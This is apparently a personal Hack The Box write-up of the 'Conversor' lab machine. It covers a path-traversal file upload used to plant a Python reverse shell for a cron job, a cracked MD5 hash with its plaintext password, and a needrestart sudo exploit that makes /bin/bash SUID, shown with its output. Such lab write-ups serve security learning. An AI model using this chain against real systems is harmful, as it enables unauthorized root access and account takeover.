# HTB - Conversor

---
## General Info
- OS: Linux
- Open ports: 22, 80
- Running services: Apache:80 (2.4.52), SSH:22 (8.9p1), NeedRestart:lh(3.7)
- Endpoints:
	- /login
	- /register
	- /logout
	- /javascript
	- /about
	- /convert
	- /server-status
- VHosts: -
- Auth: -
- Pwnd date: 11/05/2026

---
## Enumeration  

- After running basic scans (nmap, fuzzing and vhost fuzzing), accessed the main page and found a conversor, that takes an XML file and a XSLT file, which gives a theme to the XML file. I'll try XXE.
- Oh. Ok. So they just gave me the source code for the application. Cool. So, I asked Claude Code (I am NOT reading python. I'd rather die) to tell me incorrect assumptions in this whole application. Well... lol. File uploading through XSTL injection that can lead to RCE, and ultimatelly, to a reverse shell. Give me a second, and I'll explain.

---
## Exploitation  

> Ok so basically, the source code does something VERY unsafe, look at these lines of code:

```python
  xml_path  = os.path.join(UPLOAD_FOLDER, xml_file.filename)
  xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)  
```

> (I honestly could've gotten this on my own but I'm lazy as fuck and its 0:00 am) 
> Sooo it's putting the files I pass it in whatever name the XML or XSLT file has. Which means path traversal. And, we can upload those files... and place them wherever we want. 
> More importantly, look at this snippet of the `install.md` file

```
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

> And knowing that this whole app is poorly secured, we can only assume that they added that cron job, and that every .py file in `/var/www/conversor.htb/scripts/` will be executed. So I placed a [[Reverse Shell#Python (reliable)|python reverse shell]], by using the path traversal, in that folder, and after a minute I got a reverse shell under the user `www-data` (which I think is the most secure thing so far lol).

- Well. I found a database (that was already present in the source code but empty) inside the main application, under `/instances/users.db`. 
- Well, the hashes are MD5, easy to crack, but since I'm on my ubuntu installation, I don't get to use hashcat. I looked at all the hashes, and besides the ones I had created, one of them was particularly interesting: `fismathack`, which is another user in the system.  

```SQLite
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
```

- I used https://crackstation.net/ to crack the hash, and it gave me back the following password: `Keepmesafeandwarm`.  I tried to SSH with the credentials `fismathack:Keepmesafeandwarm`, and got in. 
- Got user flag, starting PrivEsc

---
## PrivEsc

-  Well. Ran basic enumeration following the path described in [[Privilege Escalation - Common Library#Who am I? What permissions do I have?|PrivEsc]], and after running 
`sudo -l`, I got back this interesting SUID binary.

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

- After searching up on [GTFObins](https://gtfobins.org/gtfobins/needrestart/) that binary, I came across the folloing exploit:

```bash
echo '...' >/path/to/temp-file
needrestart -c /path/to/temp-file
```

- Once understood that needrestart is using Perl, I crafted and followed this exploit that made me root.

```bash
fismathack@conversor:~$ echo 'system("chmod +s /bin/bash");' > /tmp/privesc2.conf
fismathack@conversor:~$ sudo needrestart -c /tmp/privesc2.conf
Scanning processes...
(and a lot of bs)
fismathack@conversor:~$ /bin/bash -p
bash-5.1# whoami
root
```

- Basically, what this did was craft a config file that, after being executed, set `/bin/bash` as a SUID binary, then execute that crafted config with needrestart as sudo, and then execute that bash with the flag -p to preserve root.
- Got root flag.

---
## Rabbit holes

 - Trying XXE and XSLT Injection without checking if I could retrieve the source code (since the browser gave me an error, I thought it was unavaiable. It was not. I just had to `wget` it).

---
## Attack chain

- Retrieve source code from main page, and exploit path traversal to place a reverse shell script inside the root folder /scripts.
- Wait from Cron job to execute it.
- Retrieve DB from the page, and crack the hash for user `fismathack`, that gave me access to SSH.
- Get user flag.
- Exploit SUID binary needrestart by forcing it to make `/bin/bash` SUID.
- Execute SUID `/bin/bash` with flag -p to keep root.
- Get root flag.

---
## Learnt

-  A new Python vuln to look for. (Appending the name of the file directly onto the path of the file, that gave me path traversal file upload).
- A new PrivEsc path

---
## Notes  
- Machine rating: Easy
  
  